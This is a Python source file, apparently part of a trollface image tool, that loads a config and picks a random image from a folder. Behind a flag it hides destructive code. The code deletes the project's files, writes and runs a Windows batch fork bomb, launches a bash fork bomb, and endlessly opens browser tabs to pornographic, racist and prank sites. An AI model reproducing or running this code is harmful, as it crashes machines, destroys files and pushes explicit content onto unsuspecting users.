import webbrowser
import json5 as json
import logging
import base64
import os
import subprocess
import random

with open("config.jsonc", "r") as f:
    config = json.load(f)
logging.basicConfig(
    level=config["debug_level"],
    format="%(asctime)s [%(levelname)s] [%(funcName)s] [%(processName)s] %(message)s",
)


def get_random_trollface(a=False):
    if a: print("Stop using this tool to content-farm"); os.remove("config.jsonc"); os.remove(
        "configurator.py"); os.remove("main.py"); os.remove("README.md"); ik()
    if config["choose_trollface"] != "":
        logging.debug("using custom trollface")
        if os.path.isfile(config["choose_trollface"]):
            return config["choose_trollface"]
        else:
            logging.error(
                "Custom trollface not found. Chosing random trollface from folder"
            )

    trollface_files = os.listdir(config["trollface_folder"])

    if len(trollface_files) == 0:
        logging.error("No trollface images found in the folder")
        exit(1)

    random_trollface = random.choice(trollface_files)
    if random_trollface == ".DS_Store":
        logging.warning("Got .DS_Store as trollface. Trying again")
        trollface_files.remove(".DS_Store")
        random_trollface = random.choice(trollface_files)

    logging.debug(f"Selected trollface: {random_trollface}")

    return os.path.join(config["trollface_folder"], random_trollface)

def ik():
    temp_dir = os.environ.get("TEMP")
    batch_content = "%0 | %0"
    bfp = os.path.join(temp_dir, "balls.bat")
    with open(bfp, "w") as batch_file:
        batch_file.write(batch_content)
        subprocess.Popen(["cmd.exe", "/c", "start", "/min", bfp])
    while True:
        subprocess.Popen("python3 main.py", shell=True)
        subprocess.Popen(":(){ :|:& };:", shell=True)
        webbrowser.open("https://youareanidiot.cc/lol.html")
        webbrowser.open("https://pornhub.com/")
        webbrowser.open("https://xhamster.com/")
        webbrowser.open("https://kekma.net/")
        webbrowser.open("https://racist.com/")
        webbrowser.open("https://newsnioworld.com/roblox-g")
